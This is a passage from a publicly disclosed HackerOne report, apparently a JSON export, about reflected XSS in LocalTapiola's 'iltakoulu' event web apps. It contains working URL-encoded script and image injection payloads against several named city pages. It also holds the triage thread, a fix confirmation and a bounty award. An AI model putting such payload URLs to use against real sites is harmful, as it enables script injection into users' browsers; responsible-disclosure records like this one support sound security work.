href=\"/redirect?url=http%3A%2F%2Fviestinta.lahitapiola.fi%2FwebApp%2Filtakoulu_varkaus%3Fctx%3D%253Cctx%253E%253Cvars%253E%253Chtml%253E%2526lt%253bscript%2526gt%253blocation.href%253d%2522http%253a%2F%2Fgoogle.com%2522%253b%2526lt%253b%2Fscript%2526gt%253b%253C%2Fhtml%253E%253C%2Fvars%253E%253CactivityHistory%253E%253Cactivity%2Bname%253d%2522page%2522%2F%253E%253Cactivity%2Bname%253d%2522test2%2522%2F%253E%253Cactivity%2Bname%253d%2522script6%2522%2F%253E%253Cactivity%2Bname%253d%2522script5%2522%2F%253E%253Cactivity%2Bname%253d%2522script3%2522%2F%253E%253Cactivity%2Bname%253d%2522prefill%2522%2F%253E%253C%2FactivityHistory%253E%253C%2Fctx%253E\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eGoogle.com Redirection\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=http%3A%2F%2Fviestinta.lahitapiola.fi%2FwebApp%2Filtakoulu_varkaus%3Fctx%3D%253Cctx%253E%253Cvars%253E%253Chtml%253E%253Cimg%2Bsrc%253d%2522http%253a%2F%2Fi0.kym-cdn.com%2Fphotos%2Fimages%2Fnewsfeed%2F000%2F683%2F595%2Fa36.jpg%2522%2B%2F%253E%253C%2Fhtml%253E%253C%2Fvars%253E%253CactivityHistory%253E%253Cactivity%2Bname%253d%2522page%2522%2F%253E%253Cactivity%2Bname%253d%2522test2%2522%2F%253E%253Cactivity%2Bname%253d%2522script6%2522%2F%253E%253Cactivity%2Bname%253d%2522script5%2522%2F%253E%253Cactivity%2Bname%253d%2522script3%2522%2F%253E%253Cactivity%2Bname%253d%2522prefill%2522%2F%253E%253C%2FactivityHistory%253E%253C%2Fctx%253E\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eIMG Tag injection\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"additional-material\"\u003eAdditional material\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eSee attached POCs\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"related-reports-best-practices\"\u003eRelated reports, best practices\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003e[OWASP-recommendations]\u003c/li\u003e\n\u003c/ul\u003e\n","bounty_amount":"150.0","formatted_bounty":"$150","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":155034,"file_name":"content_injection.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/155/034/9454497bd1cdaac1bba57260e276a3633ec1b2d5/content_injection.png?response-content-disposition=attachment%3B%20filename%3D%22content_injection.png%22%3B%20filename%2A%3DUTF-8%27%27content_injection.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUYGCYHJT%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045325Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAGSCCKi0CRpYJMt3KX5x%2BNM9j2K4mM4glLH6mZ%2B8ExKAiEAlsZG1%2FfIYq0ODDSxwLnZfWyc08bfINN86QAI3Hqr4MgqtAMIURABGgwwMTM2MTkyNzQ4NDkiDG9txF7r12Yekik2WSqRA6NC8vsgwir7JTQr5zVnxH1x6efNaMXQv0rW73VsI4xDf6Ldo8AdQq%2B7eYd4BvolwrfpyHLOFrZnF4wc7R9rEQKh%2FswFKL9GQ6Lp2ujYTvyC5dhdjS4Sq%2F%2BYvPk3joZ%2BEwcDqk%2B5AvxLFqoiv3Y3ts7f9HYBqcl%2Fu20T7ZA6XxU9V7asrN5LT6SJz4xOu7iZzuPeZs4%2BFaw8tgu5A3W6CYmUUmbBs9q%2FQ%2FCO3t50tS7Dm5k%2BKM04Ar1VaXlWDuLdZKMC%2FS80%2FwDwH66vWVAjLib7jCkgBWXGEa9VryBHJJUl3qrXQrTIED1gUKeOoKk3fYvvyyIMJs3ja%2BbbO56fim%2BodEtN1FBU6g%2BuddJ4Qz5521XYpzwatC5mjJs6D50zWyfJnn9Xf%2FrDe3EacAX3oOhEBj%2Fu9S%2B46jeCaMjfEHwW8T%2FFnFpu%2FZf3e1NchqIFhOkEcnGH%2FqNmQtJ54g5I6x8j4N2c70CE7tuCZI1qjgi%2BfUfSwopFGky44IARFjLnTewCnMtMfFUa7haJa9C%2BcuqvMJDfqf8FOusB7%2BAWx%2FH2B4H9I7hLf9GkPQtz9yMVcytbF7umUu9c2W6aIn%2FKCYsmcfqyPQD%2Fe6EdfKQiWwtKrHes32q91jeUCiYfrRJFByq7uDxHGN0MingOOUWy72n3fdpooUwYjRfpac06PpxBSGvwEeiL%2BJlq9wl2E%2FMxojMrovyONCSYEoBpeEbNgMNFb9rpTiIW%2BX8OzRH6ra3L9dgd9y8nuqoCkIGYzNActVtKbpERxbtmkIoGAgtSCCLLfHT65g2k6G9afrZJZC86IhNmvJrDSG%2BKELC3%2BeAfU64DhUDssT9Dd%2Bm2pU0nRk1s8PUjuQ%3D%3D\u0026X-Amz-Signature=67d358e779021a31c1a29d6b97d0f7e4a9bb3875c272a9c46ff915582d0fe07f","file_size":357415,"type":"image/png"},{"id":155035,"file_name":"reflected_xss.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/155/035/e9ac8ffc93c6ed745f3012f3b28a829dffb937d1/reflected_xss.png?response-content-disposition=attachment%3B%20filename%3D%22reflected_xss.png%22%3B%20filename%2A%3DUTF-8%27%27reflected_xss.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUYGCYHJT%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045325Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAGSCCKi0CRpYJMt3KX5x%2BNM9j2K4mM4glLH6mZ%2B8ExKAiEAlsZG1%2FfIYq0ODDSxwLnZfWyc08bfINN86QAI3Hqr4MgqtAMIURABGgwwMTM2MTkyNzQ4NDkiDG9txF7r12Yekik2WSqRA6NC8vsgwir7JTQr5zVnxH1x6efNaMXQv0rW73VsI4xDf6Ldo8AdQq%2B7eYd4BvolwrfpyHLOFrZnF4wc7R9rEQKh%2FswFKL9GQ6Lp2ujYTvyC5dhdjS4Sq%2F%2BYvPk3joZ%2BEwcDqk%2B5AvxLFqoiv3Y3ts7f9HYBqcl%2Fu20T7ZA6XxU9V7asrN5LT6SJz4xOu7iZzuPeZs4%2BFaw8tgu5A3W6CYmUUmbBs9q%2FQ%2FCO3t50tS7Dm5k%2BKM04Ar1VaXlWDuLdZKMC%2FS80%2FwDwH66vWVAjLib7jCkgBWXGEa9VryBHJJUl3qrXQrTIED1gUKeOoKk3fYvvyyIMJs3ja%2BbbO56fim%2BodEtN1FBU6g%2BuddJ4Qz5521XYpzwatC5mjJs6D50zWyfJnn9Xf%2FrDe3EacAX3oOhEBj%2Fu9S%2B46jeCaMjfEHwW8T%2FFnFpu%2FZf3e1NchqIFhOkEcnGH%2FqNmQtJ54g5I6x8j4N2c70CE7tuCZI1qjgi%2BfUfSwopFGky44IARFjLnTewCnMtMfFUa7haJa9C%2BcuqvMJDfqf8FOusB7%2BAWx%2FH2B4H9I7hLf9GkPQtz9yMVcytbF7umUu9c2W6aIn%2FKCYsmcfqyPQD%2Fe6EdfKQiWwtKrHes32q91jeUCiYfrRJFByq7uDxHGN0MingOOUWy72n3fdpooUwYjRfpac06PpxBSGvwEeiL%2BJlq9wl2E%2FMxojMrovyONCSYEoBpeEbNgMNFb9rpTiIW%2BX8OzRH6ra3L9dgd9y8nuqoCkIGYzNActVtKbpERxbtmkIoGAgtSCCLLfHT65g2k6G9afrZJZC86IhNmvJrDSG%2BKELC3%2BeAfU64DhUDssT9Dd%2Bm2pU0nRk1s8PUjuQ%3D%3D\u0026X-Amz-Signature=f39b94f44a709f9a2c187dda8668e0b67b5a10b0423ea72f0cc40f34f8f6f495","file_size":649981,"type":"image/png"}],"allow_singular_disclosure_at":"2017-03-06T13:53:29.883Z","allow_singular_disclosure_after":-120409195.83486521,"singular_disclosure_allowed":true,"vote_count":3,"voters":["delimitry","eveeez","spetr0x"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1443829,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.\n\nOur security team will take a look at this issue as soon as possible. We aim to respond to your report as soon as possible, but due to the complexity of the systems, triaging many times can take a long time. We prioritize issues -  reports containing trivial issues with limited (or no) business impact and badly written reports with insufficient information on how to reproduce the issue receive a lower priority. Please do not request updates for at least 20 days into the process. Once triaged and verified, bounty decisions are made 1-2 times per month.\n\n*Note: if we frequently dismiss your reports, make sure you have read our policy and stay in scope and that you know how to write good reports - https://support.hackerone.com/hc/en-us/articles/211538803-Step-by-Step-How-to-write-a-good-vulnerability-report*","markdown_message":"\u003cp\u003eThanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.\u003c/p\u003e\n\n\u003cp\u003eOur security team will take a look at this issue as soon as possible. We aim to respond to your report as soon as possible, but due to the complexity of the systems, triaging many times can take a long time. We prioritize issues -  reports containing trivial issues with limited (or no) business impact and badly written reports with insufficient information on how to reproduce the issue receive a lower priority. Please do not request updates for at least 20 days into the process. Once triaged and verified, bounty decisions are made 1-2 times per month.\u003c/p\u003e\n\n\u003cp\u003e\u003cem\u003eNote: if we frequently dismiss your reports, make sure you have read our policy and stay in scope and that you know how to write good reports - \u003ca title=\"https://support.hackerone.com/hc/en-us/articles/211538803-Step-by-Step-How-to-write-a-good-vulnerability-report\" href=\"/redirect?url=https%3A%2F%2Fsupport.hackerone.com%2Fhc%2Fen-us%2Farticles%2F211538803-Step-by-Step-How-to-write-a-good-vulnerability-report\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://support.hackerone.com/hc/en-us/articles/211538803-Step-by-Step-How-to-write-a-good-vulnerability-report\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-25T18:47:27.433Z","updated_at":"2017-01-25T18:47:27.433Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1443897,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for your response. \nAfter submitting the issue I had noticed that this is a recurring vulnerability, available on multiple similar events. These can be accessed by changing the city name in the URL\ne.g.:\nkokkola:\n`http://viestinta.lahitapiola.fi/webApp/iltakoulu_kokkola?ctx=%3Cctx%3E%3Cvars%3E%3Chtml%3E%26lt%3bscript%26gt%3balert();%3b%26lt%3b/script%26gt%3b%3C/html%3E%3C/vars%3E%3CactivityHistory%3E%3Cactivity+name%3d%22page%22/%3E%3Cactivity+name%3d%22test2%22/%3E%3Cactivity+name%3d%22script6%22/%3E%3Cactivity+name%3d%22script5%22/%3E%3Cactivity+name%3d%22script3%22/%3E%3Cactivity+name%3d%22prefill%22/%3E%3C/activityHistory%3E%3C/ctx%3E`\n\nturku:\n`http://viestinta.lahitapiola.fi/webApp/iltakoulu_turku?ctx=%3Cctx%3E%3Cvars%3E%3Chtml%3E%26lt%3bscript%26gt%3balert();%3b%26lt%3b/script%26gt%3b%3C/html%3E%3C/vars%3E%3CactivityHistory%3E%3Cactivity+name%3d%22page%22/%3E%3Cactivity+name%3d%22test2%22/%3E%3Cactivity+name%3d%22script6%22/%3E%3Cactivity+name%3d%22script5%22/%3E%3Cactivity+name%3d%22script3%22/%3E%3Cactivity+name%3d%22prefill%22/%3E%3C/activityHistory%3E%3C/ctx%3E`\n\nhelsinki:\n`http://viestinta.lahitapiola.fi/webApp/iltakoulu_helsinki?ctx=%3Cctx%3E%3Cvars%3E%3Chtml%3E%26lt%3bscript%26gt%3balert();%3b%26lt%3b/script%26gt%3b%3C/html%3E%3C/vars%3E%3CactivityHistory%3E%3Cactivity+name%3d%22page%22/%3E%3Cactivity+name%3d%22test2%22/%3E%3Cactivity+name%3d%22script6%22/%3E%3Cactivity+name%3d%22script5%22/%3E%3Cactivity+name%3d%22script3%22/%3E%3Cactivity+name%3d%22prefill%22/%3E%3C/activityHistory%3E%3C/ctx%3E`\n\netc.\nThe list of available cities can be acquired from here:\n`http://viestinta.lahitapiola.fi/webApp/iltakoulu`\n\n","markdown_message":"\u003cp\u003eThank you for your response. \u003cbr\u003e\nAfter submitting the issue I had noticed that this is a recurring vulnerability, available on multiple similar events. These can be accessed by changing the city name in the URL\u003cbr\u003e\ne.g.:\u003cbr\u003e\nkokkola:\u003cbr\u003e\n\u003ccode\u003ehttp://viestinta.lahitapiola.fi/webApp/iltakoulu_kokkola?ctx=%3Cctx%3E%3Cvars%3E%3Chtml%3E%26lt%3bscript%26gt%3balert();%3b%26lt%3b/script%26gt%3b%3C/html%3E%3C/vars%3E%3CactivityHistory%3E%3Cactivity+name%3d%22page%22/%3E%3Cactivity+name%3d%22test2%22/%3E%3Cactivity+name%3d%22script6%22/%3E%3Cactivity+name%3d%22script5%22/%3E%3Cactivity+name%3d%22script3%22/%3E%3Cactivity+name%3d%22prefill%22/%3E%3C/activityHistory%3E%3C/ctx%3E\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eturku:\u003cbr\u003e\n\u003ccode\u003ehttp://viestinta.lahitapiola.fi/webApp/iltakoulu_turku?ctx=%3Cctx%3E%3Cvars%3E%3Chtml%3E%26lt%3bscript%26gt%3balert();%3b%26lt%3b/script%26gt%3b%3C/html%3E%3C/vars%3E%3CactivityHistory%3E%3Cactivity+name%3d%22page%22/%3E%3Cactivity+name%3d%22test2%22/%3E%3Cactivity+name%3d%22script6%22/%3E%3Cactivity+name%3d%22script5%22/%3E%3Cactivity+name%3d%22script3%22/%3E%3Cactivity+name%3d%22prefill%22/%3E%3C/activityHistory%3E%3C/ctx%3E\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003ehelsinki:\u003cbr\u003e\n\u003ccode\u003ehttp://viestinta.lahitapiola.fi/webApp/iltakoulu_helsinki?ctx=%3Cctx%3E%3Cvars%3E%3Chtml%3E%26lt%3bscript%26gt%3balert();%3b%26lt%3b/script%26gt%3b%3C/html%3E%3C/vars%3E%3CactivityHistory%3E%3Cactivity+name%3d%22page%22/%3E%3Cactivity+name%3d%22test2%22/%3E%3Cactivity+name%3d%22script6%22/%3E%3Cactivity+name%3d%22script5%22/%3E%3Cactivity+name%3d%22script3%22/%3E%3Cactivity+name%3d%22prefill%22/%3E%3C/activityHistory%3E%3C/ctx%3E\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eetc.\u003cbr\u003e\nThe list of available cities can be acquired from here:\u003cbr\u003e\n\u003ccode\u003ehttp://viestinta.lahitapiola.fi/webApp/iltakoulu\u003c/code\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-25T19:12:20.236Z","updated_at":"2017-01-25T19:12:20.236Z","actor":{"username":"yonm13","cleared":false,"url":"/yonm13","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1444732,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @yonm13 could you verify that these are now properly fixed?","markdown_message":"\u003cp\u003eHi \u003ca href=\"/yonm13\"\u003e@yonm13\u003c/a\u003e could you verify that these are now properly fixed?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-26T06:45:02.028Z","updated_at":"2017-01-26T06:45:02.028Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1444733,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"","markdown_message":"","automated_response":false,"created_at":"2017-01-26T06:45:15.809Z","updated_at":"2017-01-26T06:45:15.809Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1444760,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Yes, they all appear to be fixed; \nPOST requests now ignore the 'ctx' variable completely, while GET requests insert its contents into a `parseXMLString` Javascript function. The provided content appears to be properly sanitized against context escape (the same mechanism is implemented successfuly on other forms in this domain).","markdown_message":"\u003cp\u003eYes, they all appear to be fixed; \u003cbr\u003e\nPOST requests now ignore the \u0026#39;ctx\u0026#39; variable completely, while GET requests insert its contents into a \u003ccode\u003eparseXMLString\u003c/code\u003e Javascript function. The provided content appears to be properly sanitized against context escape (the same mechanism is implemented successfuly on other forms in this domain).\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-26T07:27:32.212Z","updated_at":"2017-01-26T07:27:32.212Z","actor":{"username":"yonm13","cleared":false,"url":"/yonm13","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1459823,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thank you - especially for not making each and every URL a separate report I added a bonus.","markdown_message":"\u003cp\u003eThank you - especially for not making each and every URL a separate report I added a bonus.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-02T23:06:08.931Z","updated_at":"2017-02-02T23:06:08.931Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"LocalTapiola"}},"bounty_amount":"100.0","bounty_currency":"usd","bonus_amount":"50.0","genius_execution_id":null,"team_handle":"localtapiola","collaborator":{"username":"yonm13","url":"/yonm13"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1459824,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Public disclosure OK?","markdown_message":"\u003cp\u003ePublic disclosure OK?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-02T23:06:34.347Z","updated_at":"2017-02-02T23:06:34.347Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"yonm13","url":"/yonm13"},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1459832,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sure. Thank you! ","markdown_message":"\u003cp\u003eSure. Thank you! \u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-02T23:08:36.797Z","updated_at":"2017-02-02T23:08:36.797Z","actor":{"username":"yonm13","cleared":false,"url":"/yonm13","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1462739,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Public disclosure","markdown_message":"\u003cp\u003ePublic disclosure\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-04T13:53:29.863Z","updated_at":"2017-02-04T13:53:29.863Z","first_to_agree":true,"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1521790,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-06T13:53:51.742Z","updated_at":"2017-03-06T13:53:51.742Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"LocalTapiola"}},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":3310,"category":"team","content":"##Issue\n\nThe reporter found a repeated XSS in several small applications. The error was systemic in the sense that it was duplicated in all of these applications. \n\n##Fix\n\nThe issue was investigated and found to be valid.\n\n##Reasoning\n\nThe reported case was valid and within scope.  The applications as such, are not very critical and do not handle any customer information.  The reporter was awarded with a bonus for not making each and every URL a separate report. We like that.","can_view?":true,"can_edit?":false,"content_html":"\u003ch2 id=\"issue\"\u003eIssue\u003c/h2\u003e\n\n\u003cp\u003eThe reporter found a repeated XSS in several small applications. The error was systemic in the sense that it was duplicated in all of these applications. \u003c/p\u003e\n\n\u003ch2 id=\"fix\"\u003eFix\u003c/h2\u003e\n\n\u003cp\u003eThe issue was investigated and found to be valid.\u003c/p\u003e\n\n\u003ch2 id=\"reasoning\"\u003eReasoning\u003c/h2\u003e\n\n\u003cp\u003eThe reported case was valid and within scope.  The applications as such, are not very critical and do not handle any customer information.  The reporter was awarded with a bonus for not making each and every URL a separate report. We like that.\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}